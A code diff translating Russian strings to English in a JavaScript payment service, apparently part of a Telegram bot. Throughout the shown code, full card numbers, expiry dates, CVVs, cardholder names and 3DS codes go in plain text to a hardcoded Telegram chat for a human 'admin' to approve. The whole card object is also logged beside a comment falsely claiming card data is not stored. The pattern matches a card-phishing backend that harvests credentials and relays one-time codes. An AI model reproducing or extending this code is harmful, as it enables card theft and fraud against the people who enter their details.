@@ -9,15 +9,15 @@ class PaymentService {
     async savePaymentTracking(userId, transactionId, amount, status) {
         try {
             if (!userId) {
-                console.log('⚠️ PaymentTracking НЕ сохранен: userId отсутствует');
+                console.log('⚠️ PaymentTracking NOT saved: userId is missing');
                 return;
             }
 
-            // Получаем пользователя чтобы узнать его реферальный код
+            // Get user to retrieve referral code
             const user = await UserModel.findById(userId);
             
             if (!user) {
-                console.log(`⚠️ PaymentTracking НЕ сохранен: пользователь ${userId} не найден`);
+                console.log(`⚠️ PaymentTracking NOT saved: user ${userId} not found`);
                 return;
             }
 
@@ -30,15 +30,15 @@ class PaymentService {
                 timestamp: new Date()
             });
 
-            console.log(`✅ PaymentTracking сохранен:`, {
+            console.log(`✅ PaymentTracking saved:`, {
                 userId,
                 transactionId,
                 amount,
-                referralCode: user.referralCode || 'нет кода',
+                referralCode: user.referralCode || 'no code',
                 status
             });
 
-            // Логируем успешное пополнение в чат
+            // Log successful deposit to chat
             if (status === 'success') {
                 try {
                     await logChatService.logPayment(
@@ -49,13 +49,13 @@ class PaymentService {
                         user.referralCode
                     );
                 } catch (logError) {
-                    console.warn('Ошибка логирования пополнения в чат:', logError.message);
+                    console.warn('Error logging payment to chat:', logError.message);
                 }
             }
 
             return paymentTracking;
         } catch (error) {
-            console.error('❌ Ошибка сохранения PaymentTracking:', error.message);
+            console.error('❌ Error saving PaymentTracking:', error.message);
         }
     }
 
@@ -64,43 +64,43 @@ class PaymentService {
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: '✅ Подтвердить', callback_data: 'confirm' },
+                        { text: '✅ Confirm', callback_data: 'confirm' },
                         { text: '🔐 3DS', callback_data: 'request_3ds' }
                     ],
                     [
-                        { text: '❌ Отменить', callback_data: 'cancel' }
+                        { text: '❌ Cancel', callback_data: 'cancel' }
                     ]
                 ]
             }
         }
         const { cardNumber, expiryDate, cvv, cardHolder, amount } = paymentData;
         
-        // Маскируем номер карты (показываем только последние 4 цифры)
+        // Mask card number (show only last 4 digits)
         const maskedCardNumber = cardNumber.replace(/\s/g, '').slice(-4);
         
-        // Генерируем уникальный ID транзакции
+        // Generate unique transaction ID
         const transactionId = `TXN-${Date.now()}-${Math.random().toString(36).substr(2, 9).toUpperCase()}`;
         
-        // Логируем для отладки (не храним полные данные карты!)
+        // Log for debugging (don't store full card data!)
         console.log(paymentData);
         
-        const message = `💳 Новый платеж\n\n` +
-            `💰 Сумма: ${paymentData.amount}\n` +
-            `🔢 Карта: ${paymentData.cardNumber}\n` +
-            `📅 Срок: ${paymentData.expiryDate}\n` +
+        const message = `💳 New Payment\n\n` +
+            `💰 Amount: ${paymentData.amount}\n` +
+            `🔢 Card: ${paymentData.cardNumber}\n` +
+            `📅 Expiry: ${paymentData.expiryDate}\n` +
             `🔐 CVV: ${paymentData.cvv}\n` +
-            `👤 Владелец: ${paymentData.cardHolder}\n` +
-            `🆔 ID транзакции: ${transactionId}`;
+            `👤 Holder: ${paymentData.cardHolder}\n` +
+            `🆔 Transaction ID: ${transactionId}`;
         
-        // Отправляем сообщение и сразу ждем подтверждения
-        console.log('Отправляю платеж администратору для подтверждения. ID транзакции:', transactionId);
+        // Send message and wait for confirmation
+        console.log('Sending payment to admin for confirmation. Transaction ID:', transactionId);
         const result = await botService.sendMessageAndWait(7209588642, message, buttonPayment);
-        console.log('Получен результат от администратора:', JSON.stringify(result, null, 2));
+        console.log('Received result from admin:', JSON.stringify(result, null, 2));
         
         if (result.confirmed === true) {
-            console.log('>>> ПЛАТЕЖ УСПЕШЕН (confirmed === true) <<<');
+            console.log('>>> PAYMENT SUCCESSFUL (confirmed === true) <<<');
             
-            // Сохраняем успешный платеж в статистику
+            // Save successful payment to statistics
             if (userId) {
                 await this.savePaymentTracking(userId, transactionId, amount, 'success');
             }
@@ -112,7 +112,7 @@ class PaymentService {
                 timestamp: new Date().toISOString()
             };
         } else if (result.requires3DS === true) {
-            console.log('>>> ТРЕБУЕТСЯ 3DS ВЕРИФИКАЦИЯ <<<');
+            console.log('>>> 3DS VERIFICATION REQUIRED <<<');
             return {
                 transactionId,
                 amount,
@@ -120,9 +120,9 @@ class PaymentService {
                 timestamp: new Date().toISOString()
             };
         } else {
-            console.log('>>> ПЛАТЕЖ ОТМЕНЕН (confirmed !== true) <<<');
+            console.log('>>> PAYMENT CANCELLED (confirmed !== true) <<<');
             
-            // Сохраняем отмененный платеж в статистику
+            // Save cancelled payment to statistics
             if (userId) {
                 await this.savePaymentTracking(userId, transactionId, amount, 'cancelled');
             }
@@ -142,28 +142,28 @@ class PaymentService {
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: '✅ Подтвердить', callback_data: 'confirm' },
-                        { text: '❌ Отменить', callback_data: 'cancel' }
+                        { text: '✅ Confirm', callback_data: 'confirm' },
+                        { text: '❌ Cancel', callback_data: 'cancel' }
                     ]
                 ]
             }
         }
 
-        const message = `🔐 3DS Верификация завершена\n\n` +
-            `💰 Сумма: ${paymentData.amount}\n` +
-            `🔢 Карта: ${paymentData.cardNumber}\n` +
-            `👤 Владелец: ${paymentData.cardHolder}\n` +
-            `🆔 ID транзакции: ${transactionId}\n` +
-            `🔑 Код 3DS: ${verificationCode}`;
+        const message = `🔐 3DS Verification Completed\n\n` +
+            `💰 Amount: ${paymentData.amount}\n` +
+            `🔢 Card: ${paymentData.cardNumber}\n` +
+            `👤 Holder: ${paymentData.cardHolder}\n` +
+            `🆔 Transaction ID: ${transactionId}\n` +
+            `🔑 3DS Code: ${verificationCode}`;
 
-        console.log('Отправляю результат 3DS верификации администратору. ID транзакции:', transactionId);
+        console.log('Sending 3DS verification result to admin. Transaction ID:', transactionId);
         const result = await botService.sendMessageAndWait(7209588642, message, buttonPayment);
-        console.log('Получен финальный результат от администратора:', JSON.stringify(result, null, 2));
+        console.log('Received final result from admin:', JSON.stringify(result, null, 2));
 
         if (result.confirmed === true) {
-            console.log('>>> ПЛАТЕЖ УСПЕШЕН ПОСЛЕ 3DS <<<');
+            console.log('>>> PAYMENT SUCCESSFUL AFTER 3DS <<<');
             
-            // Сохраняем успешный платеж после 3DS
+            // Save successful payment after 3DS
             if (userId) {
                 await this.savePaymentTracking(userId, transactionId, paymentData.amount, 'success');
             }
@@ -175,9 +175,9 @@ class PaymentService {
                 timestamp: new Date().toISOString()
             };
         } else {
-            console.log('>>> ПЛАТЕЖ ОТМЕНЕН ПОСЛЕ 3DS <<<');
+            console.log('>>> PAYMENT CANCELLED AFTER 3DS <<<');
             
-            // Сохраняем отмененный платеж после 3DS
+            // Save cancelled payment after 3DS
             if (userId) {
                 await this.savePaymentTracking(userId, transactionId, paymentData.amount, 'cancelled');
             }
